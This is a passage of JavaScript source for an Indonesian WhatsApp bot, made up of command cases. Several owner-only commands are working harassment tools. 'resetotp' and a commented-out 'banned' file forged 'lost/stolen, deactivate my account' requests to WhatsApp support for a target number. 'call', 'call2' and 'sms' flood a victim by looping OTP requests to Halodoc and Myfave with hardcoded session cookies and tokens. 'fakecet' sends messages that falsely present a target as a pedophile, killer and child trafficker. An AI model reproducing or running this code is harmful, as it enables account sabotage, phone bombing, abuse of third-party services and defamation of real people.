members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break

case 'tourl': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')

if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}

break
case 'toonce':
            case 'nyehh': {
            if (!isCreator) return paycall(global.ownercuy)
                if (!quoted) return paycall(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                    } else if (/audio/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        audio: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "19",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                    } else if (/document/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break

case 'block': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'unblock': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//END GROUP MENU

//========================REPEAT WHATSAPP=========================//
case 'repeat':
if (!isCreator) return paycall(global.ownercuy)
if (!text) return paycall('Masukan Text|jumlah')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
var shinchan_kawaii = `${args.join(' ')}`
var kata = shinchan_kawaii.split("|")[0];
var angka = shinchan_kawaii.split("|")[1]
let katanya = `${kata}`.repeat(angka)
await conn.sendMessage(m.chat, { text: `${katanya}` }, { quoted: blue})
break
case 'getcase': {
if (!isCreator) return paycall(global.ownercuy)
if (!args[0]) return paytod(`Use ${prefix+command} block`)
const getCase = (cases) => {
return "case" + `'${cases}'` + fs.readFileSync("main.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
}
m.reply(`${getCase(q)}`)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return paycall('Reply the Message!!')
let shinuwu= await conn.serializeM(await m.getQuotedObj())
if (!shinuwu.quoted) return paycall('Pesan yang Anda balas tidak dikirim oleh bot')
await shinuwu.quoted.copyNForward(m.chat, true)
}
break
//END REPEAT
case 'unbanned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Halo admin WhatsApp, saya mohon buka kembali akun WhatsApp saya +${targetnya} karena saya tidak melakukan spam, saat ini mungkin akun WhatsApp saya sedang di retas oleh orang yang tidak bertanggung jawab dan melakukan pelanggaran. Saya mohon untuk membuka kembali Akun WhatsApp saya agar bisa digunakan kembali karena sangat penting. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19729.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1010701544")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp🥰💖`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Sukses✓`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor Yang mau di unban!')
}
break

case 'unbanned2': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Пожалуйста, помогите мне открыть WhatsApp быстро, потому что у меня есть важная работа. Спасибо
+${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp🥰💖`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Sukses✓`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor Yang mau di unban!')
}
break

case 'unbanned3': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Olá Admin WhatsApp, quero perguntar sobre minha conta do WhatsApp que é proibida permanentemente, não sei o que fez com que minha conta do WhatsApp fosse proibida. Eu quero perguntar ou não na minha conta do WhatsApp para ser reativado. Eu imploro que você realmente reabre minha conta do WhatsApp, porque nunca realizei atividades contrárias às disposições do serviço do WhatsApp, quando minha conta do WhatsApp está sendo invadida por pessoas irresponsáveis e fazendo essas atividades (+${targetnya})`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp🥰💖`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Sukses✓`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor Yang mau di unban!')
}
break
//=================================================//
case 'resetotp': case 'kenon': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Sukses✓, silahkan tunggu 1-24 jam balasan dari pihak WhatsApp`)
} else if (payload.includes(`"payload":false`)) {
reply(`Yah Email sudah kena limit, jadi nunggu 1 minggu buat di akses lagi`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================//
case "call":
if (!isCreator) return m.reply('*khusus Owner*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6282788388737`)
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+0`)) return paycall('Tidak bisa call ke nomor ini!')
for (let x = 0; x < 10; x++) {
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {paycall(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {paycall(`${JSON.stringify(error, null, 2)}`)})
}
break
case "call2":
if (!isCreator) return reply('Khusus Owner')
let shinchan = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
let shinko = text.split("|")[1]
for (let i = 1; i < shinko ; i++){
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${shinchan}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}})
.then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Succes Spam (CALL) BY SHINCHAN SENPAI INC`);
})
.catch(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Failed Spam (CALL) BY SHINCHAN SENPAI INC`);
});
}
reply(`[ 𝙎𝙪𝙠𝙨𝙚𝙨 𝙎𝙚𝙣𝙙 𝘾𝙖𝙡𝙡 ]\n\n﹗𝐂𝐚𝐥𝐥 : ${shinchan}\n﹗𝐀𝐦𝐨𝐮𝐧𝐭 : ${shinko}\n﹗𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}\n﹗𝐓𝐚𝐧𝐠𝐠𝐚𝐥 : ${week} ${weton}, ${date}\n﹗𝐉𝐚𝐦 : ${time}\n﹗𝐎𝐰𝐧𝐞𝐫 : ẉa.me/6282134110253`)
break
//=================================================
case 'sms': {
if (!isCreator) return m.reply('*khusus Owner*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) SHINCHAN SENPAI`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break
/*case 'banned': {
if (!isCreator) return m.reply('*khusus Owner*')
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hilang/Dicuri: Harap nonaktifkan akun saya ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
paycall(`DONE`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break*/
case "unli": {
if (!isCreator) return m.reply('*khusus Owner*')
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
conn.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: conn.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case 'fakecet': {
if (!text) return m.reply(`${command} +62××××××`)
conn.sendMessage(m.sender, {text: `Olá, sou dzul, sou um antagonista que gosta de crianças pequenas pode ser chamado de pedófilo, também costumo torturar os pais e mata-los na frente dos olhos dos filhos🔪🧪🗡️, não só isso porque me sinto em vão matando sem fazer nada faço sexo com ele a força mesmo até ele mati☠️ na frente do filho. Também vou oferecer uma escrava criança pequena, quem estiver a ler esta mensagem dou um desconto de 40% muito tentador podes fazer tudo com a escrava por um preço baixo conversa whatsapp me se estiveres interessado 👇👇👇👇.
https://api.whatsapp.com/send?phone=${text}`}, {quoted: m})
}
break
case 'fakecet2': {
if (!text) return m.reply(`${command} +62××××××`)
conn.sendMessage(m.sender, {text: `Olá, eu sou Zulfi, eu sou um assassino👹👺🔪🔪 Eu amo matar humanos, torturar humanos e até mesmo torturar animais🔪👪☠️☠️, se você contratar meus serviços eu farei como ordenado, como matar humanos e tirar seus órgãos, até mesmo temos uma arma de fogo👹👺☠️🔥🔥 para acelerar o processo de matar e não requer muito tempo e o que você está esperando, contrate meus serviços eu vou matar todos os seus obstáculos se você receber esta mensagem você recebe um desconto de 45% não é tentador o que você está esperando WhatsApp me se você estiver interessado👇👇
https://api.whatsapp.com/send?phone=${text}`}, {quoted: m})
}
break
//=================================================//

default:
if (budy.startsWith('<')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}

if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}

if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(`*khusus Owner*`)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }

if (isCmd && budy.toLowerCase() != undefined) {
